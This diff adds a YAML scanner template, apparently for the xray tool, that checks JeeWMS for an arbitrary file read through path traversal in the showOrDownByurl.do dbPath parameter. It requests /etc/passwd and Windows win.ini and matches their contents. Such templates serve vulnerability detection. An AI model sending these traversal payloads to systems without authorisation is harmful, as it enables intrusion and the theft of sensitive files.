@@ -1,0 +1,22 @@
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+  - https://mp.weixin.qq.com/s/ylOuWc8elD2EtM-1LiJp9g
+expression: linux0() || windows0()
+manual: true
+name: poc-yaml-jeewms-showordownbyurl-fileread
+rules:
+  linux0:
+    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    request:
+      cache: true
+      method: GET
+      path: /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd
+  windows0:
+    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app
+      support")
+    request:
+      cache: true
+      method: GET
+      path: /systemController/showOrDownByurl.do?down=&dbPath=../../../../../Windows/win.ini
+transport: http
